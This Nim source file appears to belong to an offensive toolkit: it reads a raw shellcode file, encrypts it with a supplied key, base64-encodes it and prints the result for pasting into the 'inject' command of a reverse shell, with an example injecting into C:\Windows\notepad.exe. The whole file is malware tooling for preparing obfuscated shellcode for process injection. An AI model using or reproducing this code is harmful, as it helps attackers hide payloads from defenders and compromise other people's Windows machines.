#[ Converter for a raw shellcode.bin file for use in the reverse shell ]#

import os
import core/rc_for
from base64 import encode
from core/util import toByteSeq

when isMainModule:
  if paramCount() < 2:
    echo "Usage: ./convert <bin file> <key str>"
    quit(1)

  var binFile: string = paramStr(1)
  var key: string = paramStr(2)
  
  var shellCode: string = readFile(binFile)
  var encrypted: string = trcEnc(key, shellCode)
  var encShellCode: seq[byte] = toByteSeq(encrypted)
  var b64enc = encode(encShellCode)
  echo "Key used: ", key 
  echo "Ensure this key is set at the top of the reverse shell file\n"
  echo "SC: Paste with the inject command in the reverse shell"
  echo "Example: [LP_SHELL] > inject C:\\Windows\\notepad.exe ZmM0ODgxZTRmMGZmZm[..snip..]MjJlNjQ2YzZjMDA=\n"
  echo "[+] Copy/paste: ", b64enc

